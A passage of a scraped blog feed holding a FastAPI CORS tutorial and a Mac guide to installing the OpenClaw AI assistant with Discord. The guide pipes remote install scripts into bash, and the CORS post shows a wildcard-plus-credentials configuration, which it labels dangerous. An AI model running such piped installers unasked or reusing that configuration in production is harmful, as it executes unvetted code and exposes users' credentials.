/>\n<p>如果本文对你有帮助，欢迎来 GitHub 给个 Star，或者直接体验 <strong>HagiCode</strong> 带来的高效开发流程：</p>\n<ul>\n<li>来 GitHub 给个 Star：<a href=\"https://github.com/HagiCode-org/site\" rel=\"noopener nofollow\" target=\"_blank\">github.com/HagiCode-org/site</a></li>\n<li>访问官网了解更多：<a href=\"https://hagicode-org.github.io/site\" rel=\"noopener nofollow\" target=\"_blank\">hagicode-org.github.io/site</a></li>\n<li>观看 30 分钟实战演示：<a href=\"https://www.bilibili.com/video/BV1pirZBuEzq/\" rel=\"noopener nofollow\" target=\"_blank\">www.bilibili.com/video/BV1pirZBuEzq/</a></li>\n<li>一键安装体验：<a href=\"https://hagicode-org.github.io/site/docs/installation/docker-compose\" rel=\"noopener nofollow\" target=\"_blank\">hagicode-org.github.io/site/docs/installation/docker-compose</a></li>\n</ul>\n<p>公测已开始，欢迎安装体验！</p>\n<hr />\n<p>感谢您的阅读,如果您觉得本文有用,快点击下方点赞按钮👍,让更多的人看到本文。</p>\n<p>本内容采用人工智能辅助协作,经本人审核,符合本人观点与立场。</p>\n<ul>\n<li><strong>本文作者:</strong> <a href=\"https://www.newbe.pro\" rel=\"noopener nofollow\" target=\"_blank\">newbe36524</a></li>\n<li><strong>本文链接:</strong> <a href=\"https://hagicode-org.github.io/site/blog/2026-02-01-dotnet-core-dual-database-postgresql-sqlite/\" rel=\"noopener nofollow\" target=\"_blank\">https://hagicode-org.github.io/site/blog/2026-02-01-dotnet-core-dual-database-postgresql-sqlite/</a></li>\n<li><strong>版权声明:</strong> 本博客所有文章除特别声明外,均采用 BY-NC-SA 许可协议。转载请注明出处!</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 09:11</span>&nbsp;\n<a href=\"https://www.cnblogs.com/newbe36524\">Newbe36524</a>&nbsp;\n阅读(<span id=\"post_view_count\">57</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "FastAPI部署实战：聊聊CORS跨域那些坑",
      "link": "https://www.cnblogs.com/ymtianyu/p/19567261",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19567261\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 08:49\">\n    <span>FastAPI部署实战：聊聊CORS跨域那些坑</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        FastAPI部署时，CORS跨域问题是常见拦路虎。本文以程序员的实战视角，生动比喻解析CORS原理，提供从开发到生产环境的阶梯式配置方案，并揭露了通配符与凭证同用、中间件顺序、反向代理冲突等常见陷阱，帮助你一次性正确配置，避免安全风险。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><em>摘要：当你把精心开发的FastAPI应用部署上线，却发现前端页面死活调不通接口，浏览器控制台一片飘红……别慌，这八成是CORS（跨域资源共享）在作祟。本文带你彻底搞懂CORS原理，分享FastAPI中从“允许所有”到“精细化配置”的实战代码，并针对开发、测试、生产不同环境给出方案，最后聊聊那些文档里没写的安全陷阱和常见坑点。</em></p>\n<p>🎯 你的前端应用突然无法调用后端API了？报错里满是“CORS”？别急着怀疑人生，这几乎是每个全栈工程师部署时的“成人礼”。我当年第一次遇到时，也以为服务器炸了，对着日志研究了半天……结果就是个配置项。</p>\n<p>更真实的是，根据经验，<strong style=\"color: rgba(186, 55, 42, 1);\">超过70%的初次部署问题都与CORS配置不当有关</strong>。而且很多人即便配通了，也是简单粗暴地允许所有来源（<code style=\"color: rgba(186, 55, 42, 1);\">allow_origins=[\"*\"]</code>），为后续安全漏洞埋下伏笔。</p>\n<h2>📖 主要内容脉络</h2>\n<div>\n<p>👉 1. 什么是CORS？用“餐厅订位”的比喻秒懂</p>\n<p>👉 2. 浏览器究竟在背后干了啥？（预检请求详解）</p>\n<p>👉 3. FastAPI中CORS配置的“三段式”实战代码</p>\n<p>👉 4. 开发/测试/生产环境，配置怎么变？</p>\n<p>👉 5. 那些我踩过的坑和深夜警报</p>\n</div>\n<h2>🍽️ 第一部分：CORS不是错误，是浏览器的“保安”</h2>\n<p>想象一下，你的FastAPI后端是一家只接受预约的高级餐厅（API服务器），而前端应用是想要来吃饭的客人（运行在浏览器里）。</p>\n<p>如果客人直接从餐厅官网（同源）预约，没问题。但如果客人是从某个外卖平台（不同源）跳转过来想订位，餐厅的保安（浏览器）就会站出来：“且慢！我得先问问餐厅老板，接不接受从你这个平台来的客人。”</p>\n<p>这一问一答的过程，就是CORS机制。<strong style=\"color: rgba(186, 55, 42, 1);\">CORS本身不是错误，而是浏览器实施的一种安全策略</strong>，目的是防止恶意网站随意读取你的数据。服务器拥有最终决定权：“我允许谁（Origin）、用什么方法（Methods）、带什么凭证（Credentials）来访问我。”</p>\n<h2>🔍 第二部分：重点！那个多出来的OPTIONS请求是啥？</h2>\n<p>好，咱们先来聊聊最让人迷惑的“预检请求”（Preflight Request）。你是不是在浏览器开发者工具里，经常看到一个比你真正的API请求先发出的<code style=\"color: rgba(186, 55, 42, 1);\">OPTIONS</code>请求？</p>\n<p>这就是浏览器在“正式点餐”前，先递上一份“用餐需求清单”。</p>\n<div>\n<p>- 客人：“老板，我打算带5个人（自定义头部），用支付宝（非简单方法）来吃，行不行？”</p>\n<p>- 餐厅（服务器）：“行，来吧。”（响应中携带允许的规则）</p>\n<p>- 客人收到许可，才发出真正的携带数据和方法的POST/GET请求。</p>\n</div>\n<p>哪些情况会触发预检？简单说就是“不简单”的请求：比如用了<code style=\"color: rgba(186, 55, 42, 1);\">PUT</code>、<code style=\"color: rgba(186, 55, 42, 1);\">DELETE</code>方法，或者自定义了请求头（如<code style=\"color: rgba(186, 55, 42, 1);\">Authorization</code>），或者<code style=\"color: rgba(186, 55, 42, 1);\">Content-Type</code>是<code style=\"color: rgba(186, 55, 42, 1);\">application/json</code>。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">关键中的关键</strong>：你的服务器<strong>必须能正确处理这个OPTIONS请求</strong>，并返回正确的CORS响应头。否则，后续真正的请求就会被浏览器直接拦下。</p>\n<h2>⚙️ 第三部分：上代码！FastAPI CORS配置三段论</h2>\n<p>接下来重点来了，怎么在FastAPI里配置？官方推荐使用<code style=\"color: rgba(186, 55, 42, 1);\">fastapi.middleware.cors</code>中的<code style=\"color: rgba(186, 55, 42, 1);\">CORSMiddleware</code>。下面是我总结的“基础版”、“常见版”和“生产谨慎版”。</p>\n<h3>🎯 1. 基础版：快速让前端连上（用于本地开发）</h3>\n<p>这是最常见的写法，但<strong>仅建议用于本地开发环境</strong>。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\n# 在添加路由之前，先添加CORS中间件！\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],  # 允许所有来源，危险！\n    allow_credentials=True,\n    allow_methods=[\"*\"],  # 允许所有方法\n    allow_headers=[\"*\"],  # 允许所有头部\n)\n\n@app.get(\"/\")\nasync def main():\n    return {\"message\": \"Hello World\"}</code></pre>\n<p>“偷懒一时爽，上线火葬场。” 这个配置虽然能快速解决问题，但<code style=\"color: rgba(186, 55, 42, 1);\">allow_origins=[\"*\"]</code>和<code style=\"color: rgba(186, 55, 42, 1);\">allow_credentials=True</code>是<strong style=\"color: rgba(186, 55, 42, 1);\">绝对不能同时在生产环境使用的</strong>！这会导致严重的凭据泄露风险。</p>\n<h3>🎯 2. 常见版：指定前端来源（用于测试/预发布）</h3>\n<p>更安全的做法是明确列出你信任的前端应用地址。</p>\n<pre class=\"language-python highlighter-hljs\"><code>app.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\n        \"http://localhost:3000\",        # 本地开发\n        \"https://test.yourfrontend.com\", # 测试环境\n        \"https://staging.yourfrontend.com\",\n    ],\n    allow_credentials=True,\n    allow_methods=[\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"], # 明确列出\n    allow_headers=[\"Authorization\", \"Content-Type\", \"Accept\"], # 明确列出\n    max_age=600, # 预检请求结果缓存时间（秒），减轻服务器压力\n)</code></pre>\n<p>看，这样是不是清晰多了？浏览器来自这些地址的请求才会被放行。</p>\n<h3>🎯 3. 动态配置版（适合多环境）</h3>\n<p>实际项目中，不同环境的前端地址不同。我习惯通过环境变量来动态配置。</p>\n<pre class=\"language-python highlighter-hljs\"><code>import os\nfrom typing import List\n\n# 从环境变量读取，用逗号分隔多个origin\nALLOWED_ORIGINS: List[str] = os.getenv(\"ALLOWED_ORIGINS\", \"\").split(\",\")\n# 如果没配置，本地开发默认允许localhost\nif not ALLOWED_ORIGINS or ALLOWED_ORIGINS == ['']:\n    ALLOWED_ORIGINS = [\"http://localhost:3000\", \"http://127.0.0.1:3000\"]\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=ALLOWED_ORIGINS,\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)</code></pre>\n<p>然后在生产环境的<code style=\"color: rgba(186, 55, 42, 1);\">.env</code>或配置文件中设置：<code style=\"color: rgba(186, 55, 42, 1);\">ALLOWED_ORIGINS=https://www.yourproduct.com,https://admin.yourproduct.com</code></p>\n<h2>🚨 第四部分：我踩过的坑，希望你绕过去</h2>\n<p>再说个容易翻车的点。<strong style=\"color: rgba(186, 55, 42, 1);\">顺序！中间件的顺序很重要！</strong></p>\n<p>一定要在<code style=\"color: rgba(186, 55, 42, 1);\">app.add_middleware(CORSMiddleware, ...)</code>之后再添加你的自定义中间件或路由。否则，你的自定义中间件可能会在处理请求时因为CORS头还没设置而遇到问题。</p>\n<p>另外，当你的前端使用了<code style=\"color: rgba(186, 55, 42, 1);\">axios</code>等库，并且请求携带了<code style=\"color: rgba(186, 55, 42, 1);\">withCredentials: true</code>（比如发送Cookie或Authorization头）时，后端的<code style=\"color: rgba(186, 55, 42, 1);\">allow_origins</code> <strong>不能是通配符<code style=\"color: rgba(186, 55, 42, 1);\">\"*\"</code></strong>，必须明确指定域名，否则浏览器会报错。这是安全规范。</p>\n<p>还有一个隐藏坑：<strong>Nginx/Apache等反向代理的配置</strong>。有时候你明明在FastAPI里配对了，但请求还是被挡。这时候记得检查一下你的反向代理层（比如Nginx）是否也添加了CORS相关的响应头，造成冲突或覆盖。通常我们只在应用层（FastAPI）处理CORS就够了。</p>\n<p>最后啰嗦一句，CORS是<strong>浏览器</strong>的策略。如果你用<code style=\"color: rgba(186, 55, 42, 1);\">curl</code>、<code style=\"color: rgba(186, 55, 42, 1);\">postman</code>直接测试API，是<strong>看不到CORS错误的</strong>。测试时一定要通过浏览器环境！</p>\n<hr />\n<p>好了，关于FastAPI的CORS，我的经验差不多都倒出来了。别再因为一个通配符配置引发安全事件，希望这篇能帮你省下几个熬夜debug的晚上。</p>\n<p>如果你在部署时还遇到过其他奇怪的“拦路虎”，或者有更优雅的配置方案，<strong>一定在下面分享出来啊</strong>！技术人的成长，不就是靠这样一次次“踩坑”和“填坑”的接力嘛。收藏这篇文章，下次部署前翻出来对照一下，大概率能帮你平稳落地。</p>\n<p>— 你的技术老朋友，一名程序媛</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 08:49</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">一名程序媛呀</a>&nbsp;\n阅读(<span id=\"post_view_count\">47</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Mac专享！喂饭级教程：手把手带你用MiniMax 2.1与Discord部署个人AI助手OpenClaw",
      "link": "https://www.cnblogs.com/weipo0105/p/19567203",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/weipo0105/p/19567203\" id=\"cb_post_title_url\" title=\"发布于 2026-02-03 08:30\">\n    <span>Mac专享！喂饭级教程：手把手带你用MiniMax 2.1与Discord部署个人AI助手OpenClaw</span>\n    \n\n</a>\n\n\t\t</h1>\n\t\t<div class=\"clear\"></div>\n\t\t<div class=\"postBody\">\n\t\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"Mac专享！喂饭级教程：手把手带你用MiniMax 2.1与Discord部署个人AI助手OpenClaw\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/1205021/202602/1205021-20260203082925520-94146276.png\" />\n        这篇教程详细讲解如何在Mac上部署开源AI助手OpenClaw。我们将使用MiniMax 2.1作为AI大脑，并以Discord作为交互平台，手把手带你完成从环境准备、安装配置到最终打通的完整流程。跟随步骤，你就能在Discord中指挥专属AI助手处理任务。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>上一篇文章中，我为大家详细介绍了如何在 Windows 上部署 <strong>OpenClaw</strong> 并接入飞书：<a href=\"https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ\" rel=\"noopener nofollow\" target=\"_blank\">【保姆级教程】手把手教你安装 OpenClaw 并接入飞书，让 AI 在聊天软件里帮你干活</a>。</p>\n<p>不少朋友询问是否有 Mac 版的部署教程。今天，教程就来啦！其实在 Mac 上部署 OpenClaw 与 Windows 步骤基本一致。</p>\n<p>本次教程除了从零完成 OpenClaw 的部署外，最大的不同在于交互平台换成了 <strong>Discord</strong>。接下来，就跟着我一步步完成部署吧！</p>\n<h1 id=\"一什么是-openclaw\">一、什么是 OpenClaw</h1>\n<p><strong>OpenClaw</strong>（原名 ClawdBot）是一个开源的个人 AI 助手平台，运行在你自己的设备上。它支持通过 WhatsApp、Telegram、Slack、Discord、飞书、钉钉、QQ、企业微信等多个平台与你互动。</p>\n<p>其特点包括：</p>\n<ul>\n<li><strong>本地优先</strong>：运行在本地设备，数据完全由自己掌控</li>\n<li><strong>多平台支持</strong>：支持 macOS、Linux、Windows（WSL2）</li>\n<li><strong>多通道连接</strong>：可接入 WhatsApp、Telegram、Slack、Discord、Google Chat、Signal、iMessage 等</li>\n<li><strong>24/7 在线</strong>：以后台服务形式持续运行</li>\n<li><strong>高度可定制</strong>：支持技能扩展与自定义配置</li>\n</ul>\n<hr />\n<h1 id=\"二基本要求\">二、基本要求</h1>\n<ul>\n<li><strong>Node.js</strong>：版本 ≥ 22.0.0（必需）</li>\n<li><strong>npm</strong>：版本 ≥ 9.0.0（随 Node.js 安装）</li>\n<li><strong>一个 AI 模型的 API Key</strong>（本教程使用 MiniMax M2.1）</li>\n</ul>\n<hr />\n<h1 id=\"三安装前准备\">三、安装前准备</h1>\n<h2 id=\"第一步检查-nodejs-版本\">第一步：检查 Node.js 版本</h2>\n<p>打开 <strong>终端（Terminal）</strong>，按 <code>Cmd + Space</code> 输入 “Terminal” 并回车。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>执行以下命令检查 Node.js 版本：</p>\n<pre><code class=\"language-bash\">node --version\n</code></pre>\n<p><strong>预期输出</strong>：显示版本号，只要高于 v22.x.x 即可。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>如果未安装 Node.js 或版本过低，请继续下一步。</p>\n<h2 id=\"第二步安装-nodejs如需\">第二步：安装 Node.js（如需）</h2>\n<h3 id=\"方法一使用官方安装包推荐新手\">方法一：使用官方安装包（推荐新手）</h3>\n<ol>\n<li>访问 Node.js 官网：<a href=\"https://nodejs.org/zh-cn/download\" rel=\"noopener nofollow\" target=\"_blank\">https://nodejs.org/zh-cn/download</a></li>\n<li>下载 LTS 版本（推荐 22.x 或更高）</li>\n<li>双击下载的 <code>.pkg</code> 文件，按提示完成安装</li>\n<li>安装后重启终端，执行 <code>node --version</code> 验证</li>\n</ol>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"方法二使用-homebrew推荐开发者\">方法二：使用 Homebrew（推荐开发者）</h3>\n<pre><code class=\"language-bash\"># 安装 Homebrew（如未安装）\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n\n# 使用 Homebrew 安装 Node.js\nbrew install node\n\n# 验证安装\nnode --version\nnpm --version\n</code></pre>\n<h2 id=\"第三步准备-ai-模型-api-key\">第三步：准备 AI 模型 API Key</h2>\n<p>OpenClaw 需要连接 AI 模型才能工作。国内推荐使用 <strong>MiniMax M2.1</strong>。</p>\n<h4 id=\"获取-minimax-api-key\">获取 MiniMax API Key：</h4>\n<p>1、注册或登录账号</p>\n<p>访问官网：<a href=\"https://platform.minimaxi.com/subscribe/coding-plan?code=FSXNO2PNQ1&amp;source=link\" rel=\"noopener nofollow\" target=\"_blank\">https://platform.minimaxi.com/subscribe/coding-plan?code=FSXNO2PNQ1&amp;source=link</a></p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>2、选择适合的订阅套餐</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>3、获取API Key</p>\n<p>进入 <strong>Coding plan</strong> 页面，找到 API Key，点击重置并复制。妥善保存复制的 API Key<br />\n直达地址：<a href=\"https://platform.minimaxi.com/user-center/payment/coding-plan\" rel=\"noopener nofollow\" target=\"_blank\">https://platform.minimaxi.com/user-center/payment/coding-plan</a></p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h1 id=\"四安装-openclaw\">四、安装 OpenClaw</h1>\n<h2 id=\"一自动脚本安装推荐\">一）自动脚本安装（推荐）</h2>\n<p>这是最简单、最标准的安装方式。</p>\n<pre><code class=\"language-bash\"># 使用官方脚本安装 OpenClaw\ncurl -fsSL https://openclaw.ai/install.sh | bash\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<hr />\n<h2 id=\"二初始化配置\">二）初始化配置</h2>\n<p>运行自动脚本安装完成后，会自动进入配置向导，引导你完成以下设置：</p>\n<h4 id=\"1-风险告知\">1. 风险告知</h4>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h4 id=\"2-引导面板模式选择快速开始\">2. 引导面板模式：选择“快速开始”</h4>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h4 id=\"3-设置-ai-模型\">3. 设置 AI 模型</h4>\n<p>选择 AI 提供商：这里我们选择 <strong>MiniMax</strong>。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择模型：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>输入 API Key：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择默认模型：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h4 id=\"4-配置与-openclaw-通信的渠道\">4. 配置与 OpenClaw 通信的渠道</h4>\n<p>这里我们<strong>先选择跳过</strong>。本教程后续将使用 <strong>Discord</strong> 与 OpenClaw 通信。由于 Discord 配置稍显繁琐，后面会单独用一节详细讲解如何接入 Discord 机器人。你需要提前下载并注册好 Discord。如果觉得困难，也可选择飞书，详细配置可参考我上一篇文章：<a href=\"https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ\" rel=\"noopener nofollow\" target=\"_blank\">https://mp.weixin.qq.com/s/JGd4u8g-Fti4sRcJcSiOLQ</a>。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h4 id=\"5-配置-skills\">5. 配置 Skills</h4>\n<p>Skills 也先跳过，后续可通过 Web UI 界面配置：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h4 id=\"6-配置-hooks\">6. 配置 Hooks</h4>\n<p>Hooks 我们暂不需要配置。使用上下箭头选择 <strong>Skip for now</strong>，按下 <strong>空格键</strong> 选中，然后回车。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>此时开始自动安装 <strong>Gateway</strong> 服务：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>稍等片刻，Gateway 服务安装完成，开始选择启动机器人的方式：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>完成后，OpenClaw 会自动通过默认浏览器打开 Web UI 页面：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h1 id=\"五配置-discord-即时通信平台\">五、配置 Discord 即时通信平台</h1>\n<p>OpenClaw 支持多种通讯平台，本教程我们选择 <strong>Discord</strong>。</p>\n<h2 id=\"一注册账号并登录\">一）注册账号并登录</h2>\n<blockquote>\n<p>注意：你需要自行解决上网问题。</p>\n</blockquote>\n<p>官方地址：<a href=\"https://discord.com\" rel=\"noopener nofollow\" target=\"_blank\">https://discord.com</a></p>\n<h2 id=\"二创建一个服务器\">二）创建一个服务器</h2>\n<h3 id=\"1-点击添加服务器\">1. 点击“添加服务器”</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"2-选择亲自创建\">2. 选择“亲自创建”</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"3-选择仅供我和我的朋友使用\">3. 选择“仅供我和我的朋友使用”</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"4-自定义服务器名称\">4. 自定义服务器名称</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h2 id=\"三进入开发者后台\">三）进入开发者后台</h2>\n<p>访问地址：<a href=\"https://discord.com/developers/applications\" rel=\"noopener nofollow\" target=\"_blank\">https://discord.com/developers/applications</a></p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h2 id=\"四创建应用\">四）创建应用</h2>\n<h3 id=\"1-点击创建应用\">1. 点击“创建应用”</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"2-输入应用名称\">2. 输入应用名称</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"3-自动跳转到通用信息页面\">3. 自动跳转到“通用信息”页面</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"4-获取-token\">4. 获取 Token</h3>\n<p>点击 <strong>Bot</strong> 菜单，然后点击 <strong>重置 Token</strong>。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"5-重置完成后复制你的-token\">5. 重置完成后，复制你的 Token</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"6-在当前页面继续向下滚动找到-message-content-intent-并启用\">6. 在当前页面继续向下滚动，找到 <code>Message Content Intent</code> 并启用</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"7-进入-oauth2-配置页面勾选-bot\">7. 进入 <strong>OAuth2</strong> 配置页面，勾选 <strong>Bot</strong></h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"8-继续向下滚动找到-bot-permissions勾选-send-messages-和-read-message-history\">8. 继续向下滚动，找到 <strong>Bot Permissions</strong>，勾选 <strong>Send Messages</strong> 和 <strong>Read Message History</strong></h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"9-滚动到底部复制生成的-bot-链接\">9. 滚动到底部，复制生成的 Bot 链接</h3>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"10-将-bot-加入服务器\">10. 将 Bot 加入服务器</h3>\n<p>在浏览器中打开刚才复制的链接，选择一个服务器（相当于将创建的机器人加入该服务器），选择前面创建的自定义服务器。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>点击“授权”：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>授权成功：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>现在，你可以在自己创建的服务器中 @ 刚才添加的机器人了：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h2 id=\"五将-discord-接入-openclaw\">五）将 Discord 接入 OpenClaw</h2>\n<h3 id=\"1-进入-openclaw-配置\">1. 进入 OpenClaw 配置</h3>\n<p>执行以下命令：</p>\n<pre><code class=\"language-bash\">openclaw config\n</code></pre>\n<p>进入设置，选择“本地”：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择“渠道”：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择“配置连接”：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择 <strong>Discord</strong>：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>填入前面获取的 Bot Token：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>允许所有频道：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>选择“完成”：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>访问策略保持默认：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>配对模式也保持默认：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"2-启动网关服务\">2. 启动网关服务</h3>\n<p>执行以下命令启动网关服务：</p>\n<pre><code class=\"language-bash\">openclaw gateway\n</code></pre>\n<p>如果之前已启动过，请先执行 <code>openclaw gateway stop</code> 停止，再执行以上命令。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"3-将-discord-与-openclaw-配对\">3. 将 Discord 与 OpenClaw 配对</h3>\n<p>回到 Discord 创建的频道，点击右上角的“显示成员”，可以看到当前频道成员。点击我们添加的 Bot：OpenClaw。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>你会看到一个私聊输入框，可以试着发送一句话：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>此时会跳转到私信聊天界面，并显示一个<strong>配对码</strong>。复制这个配对码。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>打开一个新的终端窗口，输入以下命令：</p>\n<pre><code class=\"language-bash\">openclaw pairing approve discord &lt;Pairing code&gt;\n</code></pre>\n<p>将 <code>&lt;Pairing code&gt;</code> 替换为刚才复制的配对码。<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<h3 id=\"4-重启网关服务\">4. 重启网关服务</h3>\n<p>回到启动网关的命令行窗口，按下 <code>Ctrl + C</code> 停止服务，然后重新启动：</p>\n<pre><code class=\"language-bash\">openclaw gateway\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>请注意，这个命令行窗口不能关闭，否则服务会停止。如果希望后台静默运行（即使关闭窗口也不受影响），可以执行：</p>\n<pre><code class=\"language-bash\">nohup openclaw gateway --port 18789 --verbose &gt; /dev/null 2&gt;&amp;1 &amp;\n</code></pre>\n<h3 id=\"5-测试\">5. 测试</h3>\n<p>现在回到 Discord 的服务器频道，在频道中 @ 你创建的机器人：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>查看桌面文档的实际内容（示例）：<br />\n<img alt=\"\" class=\"lazyload\" /></p>\n<p>Discord 拥有多平台客户端，你也可以在手机上安装 Discord，通过手机指挥 OpenClaw 工作。</p>\n<p>至此，OpenClaw 已成功与 Discord 打通。现在你可以在 Discord 中通过与 Bot 对话的方式，指挥 OpenClaw 操控你的电脑了！</p>\n<h1 id=\"六常用命令\">六、常用命令</h1>\n<h3 id=\"gateway-管理\">Gateway 管理</h3>\n<pre><code class=\"language-bash\"># 启动 Gateway\nopenclaw gateway\n\n# 启动并显示详细日志\nopenclaw gateway --verbose\n\n# 指定端口启动\nopenclaw gateway --port 18789\n</code></pre>\n<h3 id=\"配置管理\">配置管理</h3>\n<pre><code class=\"language-bash\"># 运行配置向导\nopenclaw onboard\n\n# 系统健康检查\nopenclaw doctor\n\n# 查看配置\ncat ~/.openclaw/openclaw.json\n</code></pre>\n<h3 id=\"更新管理\">更新管理</h3>\n<pre><code class=\"language-bash\"># 更新到最新版本\nopenclaw update\n\n# 切换到特定频道\nopenclaw update --channel stable    # 稳定版\nopenclaw update --channel beta      # 测试版\nopenclaw update --channel dev       # 开发版\n</code></pre>\n<h1 id=\"结语\">结语</h1>\n<p>要想让 OpenClaw 出色地帮我们完成各种任务，还需要为它安装各种 Skills。<strong>点击头像关注我</strong>，接下来我会逐步分享 OpenClaw 的更多进阶玩法。</p>\n<p>也欢迎通过主页找到我，加入 <strong>OpenClaw 实战交流群</strong>，与更多创作者一起碰撞灵感、探索新奇玩法！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t</div>\n\t\t<div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-03 08:30</span>&nbsp;\n<a href=\"https://www.cnblogs.com/weipo0105\">阿坡RPA</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Laravel AI SDK 在 Laracon India 2026 首次亮相",
      "link": "https://www.cnblogs.com/catchadmin/p/19567163",
      "published": "",
